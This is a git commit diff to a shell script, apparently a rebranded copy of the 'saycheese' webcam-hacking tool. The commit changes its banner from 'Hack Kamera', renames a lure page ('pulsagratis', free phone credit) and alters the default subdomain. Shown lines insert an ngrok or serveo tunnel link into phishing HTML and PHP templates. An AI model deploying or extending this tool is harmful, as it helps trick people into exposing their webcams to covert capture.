2103203caed683b68d4a92ba998698b36b340133
mrw3w3n <68137152+mrwawanj@users.noreply.github.com>
2021-01-31 23:44:30 +0700

    Update and rename Kamera.sh to kamera.sh

--- kamera.sh
+++ kamera.sh
@@ -7,15 +7,15 @@ trap 'printf "\n";stop' 2
 
 banner() {
 
-printf "\e[1;91m  _    _  _______   _         _   _______  ______    _______ \e[0m\n"
-printf "\e[1;91m | | / / | | _ | | | \      /| | | |____| | _____|  | | _ | | \e[0m\n"
-printf "\e[1;91m | |/ /  | |(_)| | | |\    / | | | |      | |(_) |  | |(_)| | \e[0m\n"
-printf "\e[1;91m | / /   | |•••| | | | \  /  | | | |____  | \____|  | |•••| | \e[0m\n"
-printf "\e[1;77m | \ \   | |•••| | | |  \/   | | | |____| | |\ \    | |•••| | \e[0m\n"
-printf "\e[1;77m | |\ \  | |   | | | |       | | | |____  | | \ \   | |   | | \e[0m\n"
-printf "\e[1;77m |_| \_\ |_|   |_| |_|       |_| |_|____| |_|  \_\  |_|   |_| \e[0m\n"
 
-printf " \e[1;77m Hack Kamera v1.0 Coded By Mr.W4W4N\e[0m \n"
+printf "\e[1;92m  ____              \e[0m\e[1;77m ____ _                          \e[0m\n"
+printf "\e[1;92m / ___|  __ _ _   _ \e[0m\e[1;77m/ ___| |__   ___  ___  ___  ___  \e[0m\n"
+printf "\e[1;92m \___ \ / _\` | | | \e[0m\e[1;77m| |   | '_ \ / _ \/ _ \/ __|/ _ \ \e[0m\n"
+printf "\e[1;92m  ___) | (_| | |_| |\e[0m\e[1;77m |___| | | |  __/  __/\__ \  __/ \e[0m\n"
+printf "\e[1;92m |____/ \__,_|\__, |\e[0m\e[1;77m\____|_| |_|\___|\___||___/\___| \e[0m\n"
+printf "\e[1;92m              |___/ \e[0m                                 \n"
+
+printf " \e[1;77m v1.0 coded by github.com/thelinuxchoice/saycheese\e[0m \n"
 
 printf "\n"
 
@@ -122,7 +122,7 @@ printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $s
 payload_ngrok() {
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-sed 's+forwarding_link+'$link'+g' pulsagratis.html > index2.html
+sed 's+forwarding_link+'$link'+g' saycheese.html > index2.html
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 
 
@@ -210,7 +210,7 @@ payload() {
 
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 
-sed 's+forwarding_link+'$send_link'+g' pulsagratis.html > index2.html
+sed 's+forwarding_link+'$send_link'+g' saycheese.html > index2.html
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 
 
@@ -219,7 +219,7 @@ sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 start() {
 
 default_choose_sub="Y"
-default_subdomain="Mr.W4W4N$RANDOM"
+default_subdomain="saycheese$RANDOM"
 
 printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
 read choose_sub
@@ -240,4 +240,3 @@ checkfound
 banner
 dependencies
 start1
-
